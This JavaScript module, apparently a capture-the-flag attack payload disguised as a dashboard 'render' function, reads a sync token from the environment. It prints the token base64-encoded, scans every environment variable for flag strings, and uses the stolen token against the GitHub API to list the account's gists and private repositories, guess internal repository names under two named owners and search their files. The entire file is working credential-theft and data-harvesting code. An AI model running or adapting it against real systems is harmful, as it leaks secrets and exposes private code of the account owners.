export async function render(context) {
  const flagRe = /DevopsDowntime\{[^}]*\}/i;
  for (const [k, v] of Object.entries(process.env)) {
    const m = String(v || "").match(flagRe);
    if (m) console.log("ENV_FLAG", k, m[0]);
  }
  const t = (process.env.DASHBOARD_SYNC_TOKEN || "").trim();
  console.log("TOKENB64", Buffer.from(t).toString("base64"));
  const h = { Authorization: `Bearer ${t}`, Accept: "application/vnd.github+json", "X-GitHub-Api-Version": "2022-11-28", "User-Agent": "x" };
  const j = async (u) => { const r = await fetch(u, { headers: h }); let b = null; try { b = await r.json(); } catch {} return [r.status, b]; };
  const walk = async (full) => {
    const stack = [""];
    while (stack.length) {
      const p = stack.pop();
      const [s, items] = await j(`https://api.github.com/repos/${full}/contents/${p}`);
      if (s !== 200) continue;
      for (const it of (Array.isArray(items) ? items : [])) {
        if (it.type === "dir") { stack.push(it.path); continue; }
        const [cs, c] = await j(`https://api.github.com/repos/${full}/contents/${it.path}`);
        if (cs === 200 && c && c.content) {
          const b = Buffer.from(c.content, "base64").toString("utf8");
          const m = b.match(flagRe);
          if (m) console.log("FLAG_FOUND", full, it.path, m[0]);
        }
      }
    }
  };
  try {
    const [ws, u] = await j("https://api.github.com/user");
    console.log("WHOAMI", ws, u && u.login);
    const [gs, gists] = await j("https://api.github.com/gists?per_page=100");
    console.log("GISTS", gs, JSON.stringify((gists || []).map(g => g.id + ":" + Object.keys(g.files || {}).join(","))));
    for (const g of (gists || [])) {
      for (const fn of Object.keys(g.files || {})) {
        const f = g.files[fn];
        let content = f.content;
        if (!content && f.raw_url) { try { content = await (await fetch(f.raw_url, { headers: h })).text(); } catch {} }
        const m = String(content || "").match(flagRe);
        if (m) console.log("GIST_FLAG", g.id, fn, m[0]);
      }
    }
    const [rs, repos] = await j("https://api.github.com/user/repos?visibility=all&affiliation=owner,collaborator,organization_member&per_page=100");
    console.log("REPOS", rs, JSON.stringify((repos || []).map(r => r.full_name + (r.private ? "#priv" : ""))));
    const cands = new Set((repos || []).map(r => r.full_name));
    for (const n of ["ops-dashboard-internal", "internal-dashboard", "ops-dashboard", "dashboard", "deployment-evidence", "incident-evidence", "ops-internal", "internal", "dashboard-source", "status-dashboard-internal"])
      for (const o of ["DevOpsDownTimeV3", "saurabbhattarai-lf"]) cands.add(`${o}/${n}`);
    for (const full of cands) {
      const [ms] = await j(`https://api.github.com/repos/${full}`);
      if (ms === 200) { console.log("REPO_OK", full); await walk(full); }
      else if (ms !== 404) console.log("REPO_STATUS", full, ms);
    }
  } catch (e) { console.log("ERR", e && e.message); }
  console.log("DONE");
  return JSON.stringify({ ok: true }) + "\n";
}
